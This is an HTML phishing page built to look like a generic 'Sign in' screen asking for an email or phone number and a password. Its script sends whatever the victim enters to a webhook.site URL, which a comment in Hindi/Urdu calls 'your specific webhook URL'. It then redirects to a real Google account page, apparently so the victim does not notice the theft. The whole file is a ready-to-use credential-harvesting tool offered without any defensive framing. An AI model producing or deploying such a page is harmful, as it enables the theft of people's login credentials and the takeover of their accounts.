<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in</title>
    <style>
        body { background-color: #f2f2f2; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 350px; text-align: center; }
        input[type="email"], input[type="password"] { width: 90%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
        button { width: 100%; padding: 15px; background-color: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
        button:hover { background-color: #0056b3; }
        h2 { margin-bottom: 20px; color: #333; }
        .footer { margin-top: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>

<div class="container">
    <h2>Sign in</h2>
    <form id="loginForm">
        <input type="email" id="email" placeholder="Email or phone" required>
        <input type="password" id="pass" placeholder="Password" required>
        <button type="submit">Next</button>
    </form>
    <div class="footer">Forgot password?</div>
</div>

<script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault(); 
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        
        // Yahan tumhara specific webhook URL hai
        const webhookUrl = "https://webhook.site/f1039b62-9a8f-4443-a9c1-aede9c29392e"; 

        fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email: email, password: pass })
        }).catch(error => console.error('Error:', error));

        setTimeout(() => {
            window.location.href = "https://myaccount.google.com/?hl=en";
        }, 1000); 
    });
</script>

</body>
</html>
